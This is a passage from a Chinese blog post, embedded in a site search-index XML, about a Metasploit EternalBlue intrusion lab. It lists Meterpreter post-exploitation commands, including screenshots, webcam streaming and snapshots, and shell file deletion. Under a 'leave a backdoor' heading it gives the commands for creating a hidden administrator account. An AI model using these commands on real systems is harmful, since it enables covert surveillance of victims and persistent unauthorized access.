-<p><img src="/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926205307084.png" alt="image-20200926205307084"></p>
-<p>成功监听了。</p>
-<hr>
-<h3 id="干点坏事了-嘿嘿"><a href="#干点坏事了-嘿嘿" class="headerlink" title="干点坏事了~_ ~嘿嘿"></a>干点坏事了~_ ~嘿嘿</h3><blockquote>
-<p>sysinfo   显示远程主机系统信息</p>
-<p>getuid    查看用户身份</p>
-<p>screenshot  对远程主机当前屏幕进行截图</p>
-</blockquote>
-<p><img src="/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926210803367.png" alt="image-20200926210803367"></p>
-<p><img src="/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926211000376.png" alt="image-20200926211000376"></p>
-<blockquote>
-<p>webcam_list 查看有没有摄像头  ,webcam_stream 打开摄像头。虚拟机一般情况下没有摄像头，除非自己设置</p>
-<p>webcam_snap 拍照</p>
-</blockquote>
-<blockquote>
-<p>shell  进入控制台    如果出现中文乱码  : chcp 65001解决shell后中文乱码问题</p>
-<p>后面删文件（del   ），写文件(echo  内容&gt; 1.txt)都可以 //dos 命令</p>
-</blockquote>
-<hr>
-<h3 id="留后门"><a href="#留后门" class="headerlink" title="留后门"></a>留后门</h3><blockquote>
-<p>net user shmily-ing 111111 /add  创建shmily-ing用户</p>
-<p> net localgroup administrators shmily-ing /add   提权</p>
-</blockquote>
-<hr>
-<p><a href="https://blog.csdn.net/qq_27446553/article/details/73480807?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.nonecase&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.nonecase"><strong>EternalBlue-分析</strong></a></p>
-<p><a href="https://blog.csdn.net/wwl012345/article/details/89421881">参考博客</a></p>
-]]></content>
-      <categories>
-        <category>渗透</category>
-      </categories>
-      <tags>
-        <tag>MSF</tag>
       </tags>
   </entry>
 </search>
